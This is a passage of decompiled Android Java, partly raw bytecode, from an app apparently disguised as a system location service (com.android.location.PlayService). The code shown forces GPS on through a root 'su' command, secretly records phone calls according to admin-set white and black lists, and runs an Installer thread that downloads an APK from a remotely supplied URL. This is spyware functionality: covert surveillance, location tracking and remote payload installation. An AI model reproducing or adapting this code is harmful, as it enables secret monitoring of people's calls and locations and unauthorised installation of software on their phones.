    commandSU("am broadcast -a android.location.GPS_ENABLED_CHANGE --ez enabled true");
    FLOG("turnGpsOn. Exit.");
  }
  
  public void unregAll()
  {
    if (this.brSMSReceiver != null) {
      unregisterReceiver(this.brSMSReceiver);
    }
    if (this.brScreen != null) {
      unregisterReceiver(this.brScreen);
    }
    this.brSMSReceiver = null;
    this.brScreen = null;
  }
  
  class BEGEND
  {
    int begin;
    int end;
    
    BEGEND() {}
  }
  
  public class CallRecorder
    extends Thread
  {
    FileOutputStream fos = null;
    private String n = "";
    private int to = 0;
    
    public CallRecorder(int paramInt, String paramString)
    {
      this.to = paramInt;
      this.n = paramString;
    }
    
    /* Error */
    private void StartRecord()
    {
      // Byte code:
      //   0: ldc 36
      //   2: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   5: getstatic 44	com/android/location/PlayService:bWork	Z
      //   8: ifne +4 -> 12
      //   11: return
      //   12: getstatic 47	com/android/location/PlayService:bRecordCalls	Z
      //   15: ifne +9 -> 24
      //   18: ldc 49
      //   20: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   23: return
      //   24: getstatic 52	com/android/location/PlayService:iCallRecordState	I
      //   27: iconst_1
      //   28: if_icmpne +9 -> 37
      //   31: ldc 54
      //   33: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   36: return
      //   37: ldc 56
      //   39: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   42: iconst_0
      //   43: putstatic 59	com/android/location/PlayService:isLock	Z
      //   46: ldc 61
      //   48: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   51: invokestatic 66	ru/mobile/protector/SMSReceiver:PauseAudioRecord	()V
      //   54: ldc 68
      //   56: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   59: getstatic 71	com/android/location/PlayService:bUseLame	Z
      //   62: ifeq +164 -> 226
      //   65: iconst_1
      //   66: putstatic 52	com/android/location/PlayService:iCallRecordState	I
      //   69: ldc 73
      //   71: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   74: aload_0
      //   75: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   78: invokestatic 77	com/android/location/PlayService:access$1	(Lcom/android/location/PlayService;)Lcom/uraroji/garage/android/mp3recvoice/RecMicToMp3;
      //   81: ifnonnull +13 -> 94
      //   84: ldc 79
      //   86: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   89: iconst_0
      //   90: putstatic 52	com/android/location/PlayService:iCallRecordState	I
      //   93: return
      //   94: aload_0
      //   95: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   98: invokestatic 77	com/android/location/PlayService:access$1	(Lcom/android/location/PlayService;)Lcom/uraroji/garage/android/mp3recvoice/RecMicToMp3;
      //   101: invokevirtual 85	com/uraroji/garage/android/mp3recvoice/RecMicToMp3:isRecording	()Z
      //   104: ifeq +18 -> 122
      //   107: ldc 87
      //   109: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   112: aload_0
      //   113: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   116: invokestatic 77	com/android/location/PlayService:access$1	(Lcom/android/location/PlayService;)Lcom/uraroji/garage/android/mp3recvoice/RecMicToMp3;
      //   119: invokevirtual 90	com/uraroji/garage/android/mp3recvoice/RecMicToMp3:stop	()V
      //   122: aload_0
      //   123: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   126: invokestatic 77	com/android/location/PlayService:access$1	(Lcom/android/location/PlayService;)Lcom/uraroji/garage/android/mp3recvoice/RecMicToMp3;
      //   129: invokevirtual 85	com/uraroji/garage/android/mp3recvoice/RecMicToMp3:isRecording	()Z
      //   132: ifeq +13 -> 145
      //   135: ldc 92
      //   137: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   140: iconst_0
      //   141: putstatic 52	com/android/location/PlayService:iCallRecordState	I
      //   144: return
      //   145: aload_0
      //   146: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   149: new 94	java/lang/StringBuilder
      //   152: dup
      //   153: ldc 96
      //   155: invokespecial 98	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   158: invokestatic 102	com/android/location/PlayService:now	()Ljava/lang/String;
      //   161: invokevirtual 106	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   164: ldc 108
      //   166: invokevirtual 106	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   169: invokevirtual 111	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   172: putfield 114	com/android/location/PlayService:sAudioFilename	Ljava/lang/String;
      //   175: aload_0
      //   176: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   179: getfield 114	com/android/location/PlayService:sAudioFilename	Ljava/lang/String;
      //   182: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   185: aload_0
      //   186: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   189: invokestatic 77	com/android/location/PlayService:access$1	(Lcom/android/location/PlayService;)Lcom/uraroji/garage/android/mp3recvoice/RecMicToMp3;
      //   192: aload_0
      //   193: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   196: getfield 114	com/android/location/PlayService:sAudioFilename	Ljava/lang/String;
      //   199: invokevirtual 117	com/uraroji/garage/android/mp3recvoice/RecMicToMp3:setFilePath	(Ljava/lang/String;)V
      //   202: aload_0
      //   203: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   206: invokestatic 77	com/android/location/PlayService:access$1	(Lcom/android/location/PlayService;)Lcom/uraroji/garage/android/mp3recvoice/RecMicToMp3;
      //   209: getstatic 120	com/android/location/PlayService:iAudioSource	I
      //   212: invokevirtual 124	com/uraroji/garage/android/mp3recvoice/RecMicToMp3:setSource	(I)V
      //   215: aload_0
      //   216: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   219: invokestatic 77	com/android/location/PlayService:access$1	(Lcom/android/location/PlayService;)Lcom/uraroji/garage/android/mp3recvoice/RecMicToMp3;
      //   222: invokevirtual 127	com/uraroji/garage/android/mp3recvoice/RecMicToMp3:start	()V
      //   225: return
      //   226: iconst_1
      //   227: putstatic 52	com/android/location/PlayService:iCallRecordState	I
      //   230: ldc2_w 128
      //   233: invokestatic 133	com/android/location/PlayService$CallRecorder:sleep	(J)V
      //   236: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   239: ifnonnull +44 -> 283
      //   242: new 139	android/media/MediaRecorder
      //   245: dup
      //   246: invokespecial 140	android/media/MediaRecorder:<init>	()V
      //   249: putstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   252: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   255: ifnonnull +28 -> 283
      //   258: ldc -114
      //   260: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   263: new 34	java/lang/Exception
      //   266: dup
      //   267: invokespecial 143	java/lang/Exception:<init>	()V
      //   270: athrow
      //   271: astore_1
      //   272: iconst_0
      //   273: putstatic 52	com/android/location/PlayService:iCallRecordState	I
      //   276: aload_1
      //   277: ldc -111
      //   279: invokestatic 149	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   282: return
      //   283: aload_0
      //   284: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   287: new 94	java/lang/StringBuilder
      //   290: dup
      //   291: ldc 96
      //   293: invokespecial 98	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   296: invokestatic 102	com/android/location/PlayService:now	()Ljava/lang/String;
      //   299: invokevirtual 106	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   302: ldc 108
      //   304: invokevirtual 106	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   307: invokevirtual 111	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   310: putfield 114	com/android/location/PlayService:sAudioFilename	Ljava/lang/String;
      //   313: aload_0
      //   314: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   317: getfield 114	com/android/location/PlayService:sAudioFilename	Ljava/lang/String;
      //   320: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   323: new 151	android/text/format/Time
      //   326: dup
      //   327: invokespecial 152	android/text/format/Time:<init>	()V
      //   330: invokevirtual 155	android/text/format/Time:setToNow	()V
      //   333: aload_0
      //   334: aload_0
      //   335: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   338: aload_0
      //   339: getfield 19	com/android/location/PlayService$CallRecorder:this$0	Lcom/android/location/PlayService;
      //   342: getfield 114	com/android/location/PlayService:sAudioFilename	Ljava/lang/String;
      //   345: iconst_0
      //   346: invokevirtual 159	com/android/location/PlayService:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
      //   349: putfield 30	com/android/location/PlayService$CallRecorder:fos	Ljava/io/FileOutputStream;
      //   352: aload_0
      //   353: getfield 30	com/android/location/PlayService$CallRecorder:fos	Ljava/io/FileOutputStream;
      //   356: invokevirtual 165	java/io/FileOutputStream:getFD	()Ljava/io/FileDescriptor;
      //   359: astore_1
      //   360: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   363: aload_1
      //   364: invokevirtual 169	android/media/MediaRecorder:setOutputFile	(Ljava/io/FileDescriptor;)V
      //   367: aload_1
      //   368: invokevirtual 172	java/io/FileDescriptor:toString	()Ljava/lang/String;
      //   371: invokestatic 40	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   374: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   377: getstatic 120	com/android/location/PlayService:iAudioSource	I
      //   380: invokevirtual 175	android/media/MediaRecorder:setAudioSource	(I)V
      //   383: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   386: getstatic 178	com/android/location/PlayService:iAudioFormat	I
      //   389: invokevirtual 181	android/media/MediaRecorder:setOutputFormat	(I)V
      //   392: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   395: getstatic 184	com/android/location/PlayService:iCallEncoder	I
      //   398: invokevirtual 187	android/media/MediaRecorder:setAudioEncoder	(I)V
      //   401: getstatic 190	com/android/location/PlayService:iBitRate	I
      //   404: ifle +12 -> 416
      //   407: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   410: getstatic 190	com/android/location/PlayService:iBitRate	I
      //   413: invokevirtual 193	android/media/MediaRecorder:setAudioEncodingBitRate	(I)V
      //   416: getstatic 196	com/android/location/PlayService:iSamplingRate	I
      //   419: ifle +12 -> 431
      //   422: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   425: getstatic 196	com/android/location/PlayService:iSamplingRate	I
      //   428: invokevirtual 199	android/media/MediaRecorder:setAudioSamplingRate	(I)V
      //   431: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   434: invokevirtual 202	android/media/MediaRecorder:prepare	()V
      //   437: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   440: invokevirtual 203	android/media/MediaRecorder:start	()V
      //   443: return
      //   444: astore_1
      //   445: aload_1
      //   446: ldc -51
      //   448: invokestatic 149	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   451: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   454: ifnull +19 -> 473
      //   457: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   460: invokevirtual 208	android/media/MediaRecorder:reset	()V
      //   463: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   466: invokevirtual 211	android/media/MediaRecorder:release	()V
      //   469: aconst_null
      //   470: putstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   473: aload_1
      //   474: ifnull +7 -> 481
      //   477: aload_1
      //   478: invokevirtual 214	java/lang/Exception:printStackTrace	()V
      //   481: new 34	java/lang/Exception
      //   484: dup
      //   485: invokespecial 143	java/lang/Exception:<init>	()V
      //   488: athrow
      //   489: astore_1
      //   490: aload_1
      //   491: new 94	java/lang/StringBuilder
      //   494: dup
      //   495: ldc -40
      //   497: invokespecial 98	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   500: getstatic 120	com/android/location/PlayService:iAudioSource	I
      //   503: invokevirtual 219	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
      //   506: invokevirtual 111	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   509: invokestatic 149	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   512: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   515: invokevirtual 211	android/media/MediaRecorder:release	()V
      //   518: aconst_null
      //   519: putstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   522: new 34	java/lang/Exception
      //   525: dup
      //   526: invokespecial 143	java/lang/Exception:<init>	()V
      //   529: athrow
      //   530: astore_1
      //   531: aload_1
      //   532: new 94	java/lang/StringBuilder
      //   535: dup
      //   536: ldc -35
      //   538: invokespecial 98	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   541: getstatic 178	com/android/location/PlayService:iAudioFormat	I
      //   544: invokevirtual 219	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
      //   547: invokevirtual 111	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   550: invokestatic 149	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   553: goto -161 -> 392
      //   556: astore_1
      //   557: aload_1
      //   558: new 94	java/lang/StringBuilder
      //   561: dup
      //   562: ldc -33
      //   564: invokespecial 98	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   567: getstatic 184	com/android/location/PlayService:iCallEncoder	I
      //   570: invokevirtual 219	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
      //   573: invokevirtual 111	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   576: invokestatic 149	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   579: goto -178 -> 401
      //   582: astore_1
      //   583: aload_1
      //   584: ldc -31
      //   586: invokestatic 149	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   589: goto -158 -> 431
      //   592: astore_1
      //   593: aload_1
      //   594: ldc -29
      //   596: invokestatic 149	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   599: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   602: ifnull +9 -> 611
      //   605: getstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   608: invokevirtual 211	android/media/MediaRecorder:release	()V
      //   611: aconst_null
      //   612: putstatic 137	com/android/location/PlayService:recorder	Landroid/media/MediaRecorder;
      //   615: new 34	java/lang/Exception
      //   618: dup
      //   619: invokespecial 143	java/lang/Exception:<init>	()V
      //   622: athrow
      // Local variable table:
      //   start	length	slot	name	signature
      //   0	623	0	this	CallRecorder
      //   271	6	1	localException1	Exception
      //   359	9	1	localFileDescriptor	FileDescriptor
      //   444	34	1	localException2	Exception
      //   489	2	1	localException3	Exception
      //   530	2	1	localException4	Exception
      //   556	2	1	localException5	Exception
      //   582	2	1	localException6	Exception
      //   592	2	1	localException7	Exception
      // Exception table:
      //   from	to	target	type
      //   230	271	271	java/lang/Exception
      //   283	374	271	java/lang/Exception
      //   445	473	271	java/lang/Exception
      //   477	481	271	java/lang/Exception
      //   481	489	271	java/lang/Exception
      //   490	530	271	java/lang/Exception
      //   531	553	271	java/lang/Exception
      //   557	579	271	java/lang/Exception
      //   583	589	271	java/lang/Exception
      //   593	611	271	java/lang/Exception
      //   611	623	271	java/lang/Exception
      //   437	443	444	java/lang/Exception
      //   374	383	489	java/lang/Exception
      //   383	392	530	java/lang/Exception
      //   392	401	556	java/lang/Exception
      //   401	416	582	java/lang/Exception
      //   416	431	582	java/lang/Exception
      //   431	437	592	java/lang/Exception
    }
    
    public void StopRecord()
    {
      PlayService.FLOG("StopCallRecord()");
      if (PlayService.iCallRecordState == 0)
      {
        PlayService.FLOG("Not recording");
        return;
      }
      PlayService.iCallRecordState = 0;
      if (PlayService.bUseLame)
      {
        PlayService.FLOG("Stop Barane");
        PlayService.this.mRecMicToMp3.stop();
        return;
      }
      try
      {
        if (PlayService.recorder != null)
        {
          PlayService.recorder.stop();
          PlayService.recorder.reset();
          PlayService.recorder.release();
          PlayService.recorder = null;
        }
        PlayService.FLOG("stopped..recording");
        if (this.fos == null) {}
      }
      catch (Exception localException)
      {
        try
        {
          this.fos.close();
          this.fos = null;
          SMSReceiver.ResumeAudioRecord();
          return;
          localException = localException;
          PlayService.EXCEPT(localException, "StopCallRecord");
        }
        catch (IOException localIOException)
        {
          for (;;) {}
        }
      }
    }
    
    public void run()
    {
      if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
        Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
      }
      try
      {
        if (this.to == 1)
        {
          if (PlayService.this.SaveRecordOrNot(this.n, null, PlayService.sAdminNumber, PlayService.sRecWhiteList, PlayService.sRecBlackList, PlayService.bRecordAdmin, PlayService.bRecordUnknownOnly))
          {
            PlayService.this.StopVOIPRecord();
            PlayService.FLOG("Sleep before call=" + PlayService.iPauseBeforeCallRecord);
            if (PlayService.iPauseBeforeCallRecord > 0) {
              sleep(PlayService.iPauseBeforeCallRecord);
            }
            PlayService.FLOG("AfterSleep");
            StartRecord();
            return;
          }
          PlayService.FLOG("skip record due to SaveRecordOrNot answer");
          return;
        }
      }
      catch (Exception localException)
      {
        PlayService.EXCEPT(localException, "CallRecorder");
        return;
      }
      if (this.to == 2) {
        StopRecord();
      }
    }
  }
  
  public class Installer
    extends Thread
  {
    private String apkurl;
    
    public Installer(String paramString)
    {
      this.apkurl = paramString;
    }
    
    /* Error */
    public void run()
    {
      // Byte code:
      //   0: aload_0
      //   1: getfield 15	com/android/location/PlayService$Installer:this$0	Lcom/android/location/PlayService;
      //   4: iconst_1
      //   5: putfield 30	com/android/location/PlayService:Running	Z
      //   8: invokestatic 34	java/lang/Thread:getDefaultUncaughtExceptionHandler	()Ljava/lang/Thread$UncaughtExceptionHandler;
      //   11: instanceof 36
      //   14: ifne +15 -> 29
      //   17: new 36	com/android/location/CustomExceptionHandler
      //   20: dup
      //   21: ldc 38
      //   23: invokespecial 41	com/android/location/CustomExceptionHandler:<init>	(Ljava/lang/String;)V
      //   26: invokestatic 45	java/lang/Thread:setDefaultUncaughtExceptionHandler	(Ljava/lang/Thread$UncaughtExceptionHandler;)V
      //   29: invokestatic 50	android/os/Looper:prepare	()V
      //   32: new 52	java/lang/StringBuilder
      //   35: dup
      //   36: invokestatic 56	com/android/location/PlayService:getCurrentTime	()J
      //   39: invokestatic 62	java/lang/String:valueOf	(J)Ljava/lang/String;
      //   42: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   45: ldc 65
      //   47: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   50: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   53: pop
      //   54: aload_0
      //   55: getfield 20	com/android/location/PlayService$Installer:apkurl	Ljava/lang/String;
      //   58: ldc 75
      //   60: iconst_2
      //   61: invokevirtual 79	java/lang/String:split	(Ljava/lang/String;I)[Ljava/lang/String;
      //   64: astore 5
      //   66: aload 5
      //   68: arraylength
      //   69: iconst_2
      //   70: if_icmpne +109 -> 179
      //   73: aload_0
      //   74: aload 5
      //   76: iconst_0
      //   77: aaload
      //   78: putfield 20	com/android/location/PlayService$Installer:apkurl	Ljava/lang/String;
      //   81: aload 5
      //   83: iconst_1
      //   84: aaload
      //   85: astore 9
      //   87: new 52	java/lang/StringBuilder
      //   90: dup
      //   91: ldc 81
      //   93: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   96: aload_0
      //   97: getfield 20	com/android/location/PlayService$Installer:apkurl	Ljava/lang/String;
      //   100: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   103: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   106: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   109: new 52	java/lang/StringBuilder
      //   112: dup
      //   113: ldc 86
      //   115: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   118: aload 9
      //   120: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   123: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   126: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   129: new 52	java/lang/StringBuilder
      //   132: dup
      //   133: ldc 88
      //   135: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   138: aload_0
      //   139: getfield 20	com/android/location/PlayService$Installer:apkurl	Ljava/lang/String;
      //   142: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   145: ldc 90
      //   147: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   150: aload 9
      //   152: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   155: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   158: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   161: iconst_0
      //   162: istore_2
      //   163: iconst_5
      //   164: istore_1
      //   165: iload_2
      //   166: ifne +7 -> 173
      //   169: iload_1
      //   170: ifgt +24 -> 194
      //   173: ldc 92
      //   175: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   178: return
      //   179: aload_0
      //   180: getfield 20	com/android/location/PlayService$Installer:apkurl	Ljava/lang/String;
      //   183: invokestatic 98	android/net/Uri:parse	(Ljava/lang/String;)Landroid/net/Uri;
      //   186: invokevirtual 101	android/net/Uri:getLastPathSegment	()Ljava/lang/String;
      //   189: astore 9
      //   191: goto -104 -> 87
      //   194: new 52	java/lang/StringBuilder
      //   197: dup
      //   198: ldc 103
      //   200: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   203: aload_0
      //   204: getfield 20	com/android/location/PlayService$Installer:apkurl	Ljava/lang/String;
      //   207: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   210: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   213: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   216: new 105	java/net/URL
      //   219: dup
      //   220: aload_0
      //   221: getfield 20	com/android/location/PlayService$Installer:apkurl	Ljava/lang/String;
      //   224: invokespecial 106	java/net/URL:<init>	(Ljava/lang/String;)V
      //   227: astore 5
      //   229: ldc 108
      //   231: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   234: aload 5
      //   236: invokevirtual 112	java/net/URL:openConnection	()Ljava/net/URLConnection;
      //   239: checkcast 114	java/net/HttpURLConnection
      //   242: astore 14
      //   244: ldc 116
      //   246: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   249: aload 14
      //   251: ldc 118
      //   253: invokevirtual 121	java/net/HttpURLConnection:setRequestMethod	(Ljava/lang/String;)V
      //   256: aload 14
      //   258: iconst_1
      //   259: invokevirtual 125	java/net/HttpURLConnection:setDoOutput	(Z)V
      //   262: new 52	java/lang/StringBuilder
      //   265: dup
      //   266: ldc 127
      //   268: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   271: aload 5
      //   273: invokevirtual 130	java/net/URL:getHost	()Ljava/lang/String;
      //   276: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   279: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   282: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   285: aload_0
      //   286: getfield 15	com/android/location/PlayService$Installer:this$0	Lcom/android/location/PlayService;
      //   289: aload 5
      //   291: invokevirtual 130	java/net/URL:getHost	()Ljava/lang/String;
      //   294: invokestatic 134	com/android/location/PlayService:access$3	(Lcom/android/location/PlayService;Ljava/lang/String;)Ljava/lang/String;
      //   297: pop
      //   298: ldc -120
      //   300: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   303: aload 14
      //   305: invokevirtual 139	java/net/HttpURLConnection:connect	()V
      //   308: ldc -115
      //   310: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   313: ldc -113
      //   315: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   318: new 52	java/lang/StringBuilder
      //   321: dup
      //   322: invokespecial 144	java/lang/StringBuilder:<init>	()V
      //   325: invokestatic 150	android/os/Environment:getExternalStorageDirectory	()Ljava/io/File;
      //   328: invokevirtual 153	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
      //   331: ldc -101
      //   333: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   336: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   339: astore 5
      //   341: new 157	java/io/File
      //   344: dup
      //   345: aload 5
      //   347: invokespecial 158	java/io/File:<init>	(Ljava/lang/String;)V
      //   350: astore 6
      //   352: new 52	java/lang/StringBuilder
      //   355: dup
      //   356: ldc -96
      //   358: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   361: aload 5
      //   363: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   366: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   369: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   372: aload 6
      //   374: invokevirtual 164	java/io/File:exists	()Z
      //   377: ifne +29 -> 406
      //   380: new 52	java/lang/StringBuilder
      //   383: dup
      //   384: ldc -90
      //   386: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   389: aload 5
      //   391: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   394: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   397: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   400: aload 6
      //   402: invokevirtual 169	java/io/File:mkdirs	()Z
      //   405: pop
      //   406: new 52	java/lang/StringBuilder
      //   409: dup
      //   410: ldc -85
      //   412: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   415: aload 6
      //   417: invokevirtual 174	java/io/File:canWrite	()Z
      //   420: invokevirtual 177	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
      //   423: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   426: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   429: aload 6
      //   431: invokevirtual 174	java/io/File:canWrite	()Z
      //   434: ifne +66 -> 500
      //   437: new 52	java/lang/StringBuilder
      //   440: dup
      //   441: ldc -77
      //   443: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   446: aload 6
      //   448: invokevirtual 182	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   451: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   454: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   457: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   460: return
      //   461: astore 5
      //   463: aload 5
      //   465: ldc -72
      //   467: invokestatic 188	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   470: ldc -66
      //   472: invokestatic 84	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   475: iload_1
      //   476: iconst_1
      //   477: isub
      //   478: istore_1
      //   479: ldc2_w 191
      //   482: invokestatic 196	java/lang/Thread:sleep	(J)V
      //   485: goto -320 -> 165
      //   488: astore 5
      //   490: aload 5
      //   492: ldc -58
      //   494: invokestatic 188	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   497: goto -332 -> 165
      //   500: new 52	java/lang/StringBuilder
      //   503: dup
      //   504: ldc -56
      //   506: invokespecial 63	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   509: aload 5
